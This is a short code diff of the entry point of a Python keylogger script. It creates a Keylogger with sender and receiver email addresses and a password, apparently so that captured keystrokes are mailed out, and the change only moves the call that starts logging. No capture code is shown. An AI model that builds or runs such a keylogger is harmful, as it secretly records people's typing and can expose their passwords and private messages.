@@ -117,11 +117,11 @@ if __name__ == "__main__":
         if receiver_email == "1":
             receiver_email = sender_email
         k = Keylogger(sender_email, password, receiver_email, n)
-        k.start()
+        
     else:
         k = Keylogger()
-        k.start()
+        
+    k.start()
 
-        
-        
-        
+
+    
